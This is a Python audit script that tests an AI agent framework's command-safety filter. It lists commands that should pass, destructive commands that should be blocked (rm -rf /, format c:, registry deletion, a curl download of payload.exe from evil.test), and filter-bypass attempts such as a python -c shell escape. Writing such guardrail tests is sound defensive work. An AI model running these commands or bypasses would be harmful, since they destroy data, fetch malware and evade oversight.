import os
import sys

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from agents.worker import is_command_safe


def run_manual_autonomy_audit():
    print("DirigentAI manual autonomy and safety audit\n")
    print("=" * 60)

    safe_commands = [
        "echo Hello",
        "python --version",
        "dir",
        "ls -la",
        "git status",
        "cat README.md",
    ]

    print("1. Safe commands (expected to pass):")
    for cmd in safe_commands:
        is_safe, reason = is_command_safe(cmd)
        status = "[OK]" if is_safe else "[BLOCK]"
        print(f"  {status} {cmd}")
        if not is_safe:
            print(f"    Reason: {reason}")

    print("\n" + "=" * 60)

    dangerous_commands = [
        "rm -rf /",
        "rm -rf *",
        "format c:",
        "shutdown -s -t 0",
        r"reg delete HKLM\SOFTWARE\Microsoft /f",
        "taskkill /f /im explorer.exe",
        "systemctl stop nginx",
        "pip uninstall -y requests",
        "curl -L http://evil.test/payload.exe -o payload.exe",
    ]

    print("2. Dangerous commands (expected to be blocked):")
    blocked_count = 0
    for cmd in dangerous_commands:
        is_safe, reason = is_command_safe(cmd)
        status = "[BLOCK]" if not is_safe else "[FAIL]"
        if not is_safe:
            blocked_count += 1
            print(f"  {status} {cmd}")
            print(f"    Reason: {reason}")
        else:
            print(f"  {status} {cmd}")

    print("\n" + "=" * 60)
    print(f"Blocked: {blocked_count}/{len(dangerous_commands)}")

    observations = []

    bypass_attempts = [
        ("Python shell escape", "python -c \"import os; os.system('echo dangerous')\""),
        ("PowerShell destructive delete", "powershell Remove-Item -Recurse -Force ."),
        ("Traversal deletion pattern", "rm -rf ./../*"),
    ]

    for label, cmd in bypass_attempts:
        is_safe, _ = is_command_safe(cmd)
        if is_safe:
            observations.append(f"Potential bypass still allowed: {label}")

    print("\n3. Observations:")
    if observations:
        for item in observations:
            print(f"  - {item}")
    else:
        print("  - No obvious bypasses detected in this simple audit.")

    print("\n4. Recommended next improvements:")
    print("  - Add allowlist mode for terminal commands")
    print("  - Add stronger sandboxing for autonomous workers")
    print("  - Add audit logging for executed commands")
    print("  - Add automated tests for Windows and POSIX command safety")


if __name__ == "__main__":
    run_manual_autonomy_audit()
